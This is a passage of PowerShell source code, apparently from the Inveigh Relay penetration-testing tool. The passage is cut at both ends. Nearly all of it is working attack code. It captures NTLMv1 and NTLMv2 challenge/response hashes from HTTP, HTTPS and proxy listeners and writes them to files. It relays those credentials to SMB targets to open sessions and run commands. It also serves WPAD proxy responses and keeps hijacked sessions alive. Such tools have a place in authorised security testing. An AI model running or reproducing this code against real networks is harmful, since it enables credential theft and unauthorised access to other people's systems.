                                               $SMB_target_length_offset_bytes +
                                               $SMB_relay_target_details
                    
                            $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                            $NTLM = 'NTLM ' + $NTLM_challenge_base64
                            $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                            $inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge) > $null
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target") > $null
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP") > $null
                            $relay_step = 2
                        }
                        else
                        {
                            $NTLM = NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                        }

                    }
                    else
                    {

                        if(!$target)
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted due to lack of an eligible target") > $null
                        }
                        elseif($HTTP_source_IP -ne $Target)
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted relay due to initiator matching $target") > $null
                        }

                        $NTLM = NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                    }

                }
                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                {
                    $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
                    $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
                    $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
                    $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                    [String]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + '*'
                    $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                    $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
                       
                    if($HTTP_NTLM_domain_length -eq 0)
                    {
                        $HTTP_NTLM_domain_string = ""
                    }
                    else
                    {  
                        $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                    } 
                    
                    $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                    $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                    
                    if($HTTP_NTLM_user_length -eq 0)
                    {    
                        $HTTP_NTLM_user_string = ""
                    }
                    else
                    {
                        $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                    }

                    $HTTP_username_full = $HTTP_NTLM_domain_string + "\" + $HTTP_NTLM_user_string
                    $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                    $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                    $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes

                    if($HTTP_NTLM_length -eq 24) # NTLMv1
                    {
                        $NTLM_type = "NTLMv1"
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(48,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge

                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {     
                            $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash) > $null
                        
                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                            {
                                $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash)
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type $NTLM_type challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
                            }

                            if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                            {
                                $inveigh.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_username_full")
                            }

                        }

                    }
                    else # NTLMv2
                    {   
                        $NTLM_type = "NTLMv2"           
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(32,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                        
                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash) > $null
                        
                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                            {
                                $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
                            }

                            if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                            {
                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                            }
                        
                        }

                    }
                
                    $HTTP_response_status_code = 0x32,0x30,0x30
                    $HTTP_response_phrase = 0x4f,0x4b
                    $HTTP_client_close = $true
                    $NTLM_challenge = ""
                    
                    if($inveigh.SMB_relay -and $relay_step -eq 2)
                    {

                        if(!$Username -or $Username -contains $HTTP_NTLM_user_string -or $Username -contains "$HTTP_username_full")
                        {

                            if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$')))
                            {

                                if($inveigh.relay_user_failed_list -notcontains "$HTTP_source_IP $HTTP_username_full $Target")
                                {

                                    if(($inveigh.session_list | Where-Object {$_.User -eq $HTTP_username_full -and $_.Target -eq $target -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
                                    {
                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target") > $null
                                        $SMB_relay_failed = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_version $SMB_user_ID $SMB_session_ID $process_ID_bytes
                                        
                                        if(!$SMB_relay_failed)
                                        {

                                            if($Attack -eq 'Session')
                                            {
                                                $inveigh.session_socket_table[$inveigh.session_count] = $SMB_relay_socket
                                                $inveigh.session_table[$inveigh.session_count] = $SMB_session_ID
                                                $inveigh.session_message_ID_table[$inveigh.session_count] = 3
                                                $inveigh.session_lock_table[$inveigh.session_count] = 'open'
                                                $session_privilege = SMBRelayExecute $SMB_relay_socket $SMB_version $SMB_user_ID $SMB_session_ID $process_ID_bytes
                                                $session_object = New-Object PSObject
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $inveigh.session_count
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Target $SMB_relay_socket.Client.RemoteEndpoint.Address.IPaddressToString
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Initiator $HTTP_source_IP
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name User $HTTP_username_full
                                                
                                                if($session_privilege)
                                                {
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "yes"
                                                }
                                                else
                                                {
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "no"
                                                }

                                                if($SMB_relay_socket.Connected)
                                                {
                                                    $status = "connected"
                                                }
                                                else
                                                {
                                                    $status = "disconnected"    
                                                }

                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Status $status
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Established" $(Get-Date -format s)
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Last Activity" $(Get-Date -format s)
                                                $inveigh.session_list += $session_object
                                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sesion $($inveigh.session_count) added to session list") > $null
                                                $inveigh.session_count++
                                            }
                                            else
                                            {
                                                SMBRelayExecute $SMB_relay_socket $SMB_version $SMB_user_ID $SMB_session_ID $process_ID_bytes
                                            }

                                        }

                                        $relay_step = 0

                                    }
                                    else
                                    {
                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted since $HTTP_username_full has reached session limit on $Target") > $null
                                        $SMB_relay_socket.Close()
                                        $relay_step = 0
                                    }

                                }
                                else
                                {
                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay aborted since $HTTP_username_full has already been tried on $Target") > $null
                                    $SMB_relay_socket.Close()
                                    $relay_step = 0
                                }

                            }
                            else
                            {
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Aborting relay since $HTTP_NTLM_user_string appears to be a machine account") > $null
                                $SMB_relay_socket.Close()
                                $relay_step = 0
                            }

                        }
                        else
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list") > $null
                            $SMB_relay_socket.Close()
                            $relay_step = 0
                        }

                    }

                    if($proxy_listener)
                    {
                        $HTTP_send = $false
                    }

                }
                else
                {
                    $HTTP_client_close = $false
                }
        
            }

            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
            {
                $HTTP_message = $WPADResponse
                $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/x-ns-proxy-autoconfig")
            }

            $HTTP_timestamp = Get-Date -format r
            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)
            $HTTP_header_content_length = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
            $HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)

            if($HTTP_request_raw_URL -notmatch '/wpad.dat' -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)
            { 
                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
            }

            $packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary
            $packet_HTTPResponse.Add("HTTPResponse_RequestVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            $packet_HTTPResponse.Add("HTTPResponse_StatusCode",$HTTP_response_status_code + [Byte[]](0x20))
            $packet_HTTPResponse.Add("HTTPResponse_ResponsePhrase",$HTTP_response_phrase + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_Server",[Byte[]](0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $HTTP_timestamp + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_ContentLength",$HTTP_header_content_length + [Byte[]](0x0d,0x0a))

            if($HTTP_header_authenticate -and $HTTP_header_authenticate_data)
            {
                $packet_HTTPResponse.Add("HTTPResponse_AuthenticateHeader",$HTTP_header_authenticate + $HTTP_header_authenticate_data + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_content_type)
            {
                $packet_HTTPResponse.Add("HTTPResponse_ContentType",$HTTP_header_content_type + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_cache_control)
            {
                $packet_HTTPResponse.Add("HTTPResponse_CacheControl",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_send)
            {
                $packet_HTTPResponse.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)
                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse
                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
                $HTTP_stream.Flush()
            }

            Start-Sleep -m 10
            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL
            $HTTP_client_handle_old = $HTTP_client.Client.Handle

            if($HTTP_client_close)
            {

                if($proxy_listener)
                {
                    $HTTP_client.Client.Close()
                }
                else
                {
                    $HTTP_client.Close()
                }

            }

        }
        else
        {

            if($HTTP_data_available -or !$HTTP_reset_delay -or $HTTP_reset_delay_stopwatch.Elapsed -ge $HTTP_reset_delay_timeout)
            {
                $HTTP_client.Close()
                $HTTP_client_close = $true
                $HTTP_reset_delay = $false
            }
            else
            {
                Start-Sleep -m 100
            }

        }

    }

    $HTTP_client.Close()
    start-sleep -s 1
    $HTTP_listener.Server.blocking = $false
    Start-Sleep -s 1
    $HTTP_listener.Server.Close()
    Start-Sleep -s 1
    $HTTP_listener.Stop()
}

# Control Relay Loop ScriptBlock
$control_relay_scriptblock = 
{
    param ($ConsoleQueueLimit,$RelayAutoExit,$RunTime,$SigningCheck)

    function SigningCheck
    {
        $process_ID_bytes = Get-ProcessIDArray
        $target_list = $inveigh.target_list

        ForEach($target_entry in $target_list)
        {
            $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
            $SMB_relay_socket.Client.ReceiveTimeout = 5000
            $SMB_relay_socket.Connect($target_entry,"445")
            
            if(!$SMB_relay_socket.connected)
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target is not responding") > $null
            }
            else
            {
                SMBRelayChallenge $SMB_relay_socket $null '$SMB1' $true $process_ID_bytes > $null
            }

        }

        if(!$inveigh.target_list)
        {
            StopInveigh "empty target list"
        }

    }
    
    function OutputQueueLoop
    {

        while($inveigh.output_queue.Count -gt 0 -and $inveigh.output_pause)
        {
            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null

            if($inveigh.file_output)
            {
                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

    }

    function StopInveigh
    {
        param ([String]$exit_message)

        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
        {

            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})

                ForEach($certificate in $certificates)
                {
                    $certificate_store.Remove($certificate)
                }

                $certificate_store.Close()
            }
            catch
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }

        }

        if($inveigh.DNS_list.Count -gt 0)
        {

            foreach($DNS_host in $inveigh.DNS_list)
            {
 
                if($DNS_host.StartsWith("1,"))
                {

                    $DNS_update = Invoke-DNSUpdate -DNSType A -DNSName $DNS_host.SubString(2)

                    if($DNS_update -eq "[+] DNS update successful")
                    {
                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] DNS host (A) record for $($DNS_host.SubString(2)) removed")
                    }
                    else
                    {
                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS host (A) record for $($DNS_host.SubString(2)) remove failed")
                    }

                }

            }

            $inveigh.DNS_list = New-Object System.Collections.ArrayList
            $inveigh.requested_host_list = New-Object System.Collections.ArrayList
            $inveigh.requested_host_IP_list = New-Object System.Collections.ArrayList
        }
        
        if($inveigh.relay_running)
        {
            Start-Sleep -S 1
            $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $exit_message") > $null
            OutputQueueLoop
            Start-Sleep -S 1
            $inveigh.relay_running = $false
        }

        if($inveigh.running)
        {
            Start-Sleep -S 1
            $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $exit_message") > $null
            OutputQueueLoop
            Start-Sleep -S 1
            $inveigh.running = $false
        }

        $inveigh.HTTPS = $false
    }

    if($SigningCheck -eq 'Y')
    {
        $SigningCheck = 'N'
        SigningCheck
    }

    if($RunTime)
    {    
        $control_timeout = New-TimeSpan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }
       
    while($inveigh.relay_running)
    {

        if($RelayAutoExit -eq 'Y' -and !$inveigh.SMB_relay)
        {
            Start-Sleep -S 5
            StopInveigh "disabled relay"
        }

        if($RunTime)
        {

            if($control_stopwatch.Elapsed -ge $control_timeout)
            {
                StopInveigh "run time"
            }

        }

        if($inveigh.file_output -and -not $inveigh.control)
        {

            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveAt(0)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveAt(0)
            }

            while($inveigh.form_input_file_queue.Count -gt 0)
            {
                $inveigh.form_input_file_queue[0]|Out-File $inveigh.form_input_out_file -Append
                $inveigh.form_input_file_queue.RemoveAt(0)
            }
        
        }

        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)
        {

            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)
            {
                $inveigh.console_queue.RemoveAt(0)
            }

        }

        OutputQueueLoop
        Start-Sleep -m 5
    }

 }

# Session Refresh Loop ScriptBlock
$session_refresh_scriptblock = 
{
    param ($SessionRefresh)

    $process_ID_bytes = Get-ProcessIDArray

    while($inveigh.relay_running)
    {

        if($inveigh.session_socket_table.Count -gt 0)
        {
            $session = 0

            while($session -le $inveigh.session_socket_table.Count)
            {
                $session_timespan =  New-TimeSpan $inveigh.session_list[$session]."Last Activity" $(Get-Date)

                if($inveigh.session_socket_table[$session].Connected -and $inveigh.session_lock_table[$session] -eq 'open' -and $session_timespan.Minutes -ge $SessionRefresh)
                {
                    $inveigh.session_lock_table[$session] = 'locked'
                    $SMB_client = $inveigh.session_socket_table[$session]
                    $SMB_client_stream = $SMB_client.GetStream()
                    $SMB_session_ID = $inveigh.session_table[$session]
                    $SMB2_message_ID =  $inveigh.session_message_ID_table[$session]
                    $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                    $SMB_client_receive = New-Object System.Byte[] 1024
                    $SMB2_message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x0D,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
                    $packet_SMB2_data = New-PacketSMB2Echo
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                    try
                    {
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }
                    catch
                    {
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay SMB session $session has closed") > $null
                    }

                    $inveigh.session_lock_table[$Session] = 'open'
                    $inveigh.session_list[$Session] | Where-Object {$_."Last Activity" = Get-Date -format s}
                    $inveigh.session_message_ID_table[$Session] = $SMB2_message_ID
                }

                $session++
                Start-Sleep -s 1
            }
         
        }

        Start-Sleep -s 1
    }

}

 # HTTP Listener Startup Function 
function HTTPListener
{
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_listener = $false
    $proxy_listener = $false
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($packet_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument($HTTPResetDelay).AddArgument(
        $HTTPResetDelayTimeout).AddArgument($HTTPS_listener).AddArgument($Proxy).AddArgument(
        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($RelayAutoDisable).AddArgument(
        $Service).AddArgument($SMB_version).AddArgument($SessionLimit).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($Username).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
        $WPADResponse) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

# HTTPS Listener Startup Function 
function HTTPSListener
{
    $HTTPS_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_listener = $true
    $proxy_listener = $false
    $HTTPS_runspace.Open()
    $HTTPS_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTPS_powershell = [PowerShell]::Create()
    $HTTPS_powershell.Runspace = $HTTPS_runspace
    $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($packet_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument($HTTPResetDelay).AddArgument(
        $HTTPResetDelayTimeout).AddArgument($HTTPS_listener).AddArgument($Proxy).AddArgument(
        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($RelayAutoDisable).AddArgument(
        $Service).AddArgument($SMB_version).AddArgument($SessionLimit).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($Username).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
        $WPADResponse) > $null
    $HTTPS_powershell.BeginInvoke() > $null
}

# Proxy Listener Startup Function 
function ProxyListener
{
    $proxy_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_listener = $false
    $proxy_listener = $true
    $proxy_runspace.Open()
    $proxy_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $proxy_powershell = [PowerShell]::Create()
    $proxy_powershell.Runspace = $proxy_runspace
    $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $proxy_powershell.AddScript($packet_functions_scriptblock) > $null
    $proxy_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument($HTTPResetDelay).AddArgument(
        $HTTPResetDelayTimeout).AddArgument($HTTPS_listener).AddArgument($Proxy).AddArgument(
        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($RelayAutoDisable).AddArgument(
        $Service).AddArgument($SMB_version).AddArgument($SessionLimit).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($Username).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
        $WPADResponse) > $null
    $proxy_powershell.BeginInvoke() > $null
}

# Control Relay Startup Function
function ControlRelayLoop
{
    $control_relay_runspace = [RunspaceFactory]::CreateRunspace()
    $control_relay_runspace.Open()
    $control_relay_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $control_relay_powershell = [PowerShell]::Create()
    $control_relay_powershell.Runspace = $control_relay_runspace
    $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($packet_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($ConsoleQueueLimit).AddArgument(
        $RelayAutoExit).AddArgument($RunTime).AddArgument($SigningCheck) > $null
    $control_relay_powershell.BeginInvoke() > $null
}

# Session Refresh Startup Function
function SessionRefreshLoop
{
    $session_refresh_runspace = [RunspaceFactory]::CreateRunspace()
    $session_refresh_runspace.Open()
    $session_refresh_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $session_refresh_powershell = [PowerShell]::Create()
    $session_refresh_powershell.Runspace = $session_refresh_runspace
    $session_refresh_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $session_refresh_powershell.AddScript($packet_functions_scriptblock) > $null
    $session_refresh_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $session_refresh_powershell.AddScript($session_refresh_scriptblock).AddArgument($SessionRefresh) > $null
    $session_refresh_powershell.BeginInvoke() > $null
}

# HTTP Server Start
if($HTTP -eq 'Y')
{
    HTTPListener
    Start-Sleep -m 50
}

# HTTPS Server Start
if($HTTPS -eq 'Y')
{
    HTTPSListener
    Start-Sleep -m 50
}

# Proxy Server Start
if($Proxy -eq 'Y')
{
    ProxyListener
    Start-Sleep -m 50
}

# Control Relay Loop Start
ControlRelayLoop

# Session Refresh Loop Start
if($SessionRefresh -gt 0)
{
    SessionRefreshLoop
}

# Console Output Loop
try
{

    if($inveigh.console_output)
    {

        if($ConsoleStatus)
        {    
            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        }

        :console_loop while($inveigh.relay_running -and $inveigh.console_output)
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {

                        if($inveigh.output_stream_only)
                        {
                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                        }
                        else
                        {
                            Write-Warning($inveigh.console_queue[0])
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {

                            if($inveigh.output_stream_only)
                            {
                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                            }
                            else
                            {
                                Write-Output($inveigh.console_queue[0])
                            }

                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
                    {
                    
                        if($ConsoleOutput -ne "Low")
                        {

                            if($inveigh.output_stream_only)
                            {
                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                            }
                            else
                            {
                                Write-Output($inveigh.console_queue[0])
                            }

                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    default
                    {

                        if($inveigh.output_stream_only)
                        {
                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                        }
                        else
                        {
                            Write-Output($inveigh.console_queue[0])
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }

